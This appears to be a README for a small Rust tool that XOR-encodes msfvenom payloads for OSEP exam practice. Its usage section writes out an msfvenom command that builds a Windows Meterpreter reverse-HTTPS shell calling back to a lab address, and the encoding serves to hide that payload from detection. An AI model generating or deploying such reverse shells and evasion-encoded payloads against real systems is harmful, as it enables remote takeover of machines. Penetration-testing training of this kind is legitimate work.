# encoder-decoder

This is my tool for XOR encoding msfvenom payloads for practice in the OSEP. The tool either accepts a premade key or randomly generates (and outputs) a key of equal size to the inputted payload.

Eventually I'll add decoding functionality

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)

## Installation

**From Source**:

```bash
git clone https://github.com/Raznoo/encoder-decoder.git
cd encoder-decoder

# Build the project
cargo build --release

# The executable will be located in target/release/
```

### Encoding

```
msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=192.168.45.155 -f csharp -o raw_payload.cs

encoder-decoder encode -i raw_payload.cs -o encrypted_payload.cs

cat encrypted_payload.cs && key.txt
```

### Decoding
TODO
